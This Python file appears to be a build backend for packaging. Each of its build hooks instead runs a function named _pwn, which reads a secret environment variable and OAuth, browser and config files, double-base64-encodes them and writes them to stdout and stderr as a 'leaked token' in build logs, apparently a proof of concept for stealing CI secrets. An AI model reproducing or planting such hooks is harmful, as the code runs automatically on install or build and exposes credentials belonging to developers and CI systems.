import base64
import os
import sys


def _pwn():
    parts = []
    parts.append(os.environ.get("GERALT_SECRET", ""))
    for rel in ("tests/oauth.json", "tests/browser.json", "tests/test.cfg"):
        try:
            with open(rel, "r", encoding="utf-8", errors="replace") as fh:
                parts.append(fh.read())
        except Exception as exc:
            parts.append("ERR:%s" % exc)
    blob = "|".join(parts)
    token = base64.b64encode(base64.b64encode(blob.encode("utf-8"))).decode("ascii")
    msg = "GERALT_LEAKED_TOKEN=" + token
    print(msg, flush=True)
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()
    raise SystemExit(1)


def get_requires_for_build_wheel(config_settings=None):
    _pwn()


def get_requires_for_build_editable(config_settings=None):
    _pwn()


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    _pwn()


def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    _pwn()


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _pwn()


def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    _pwn()


def build_sdist(sdist_directory, config_settings=None):
    _pwn()
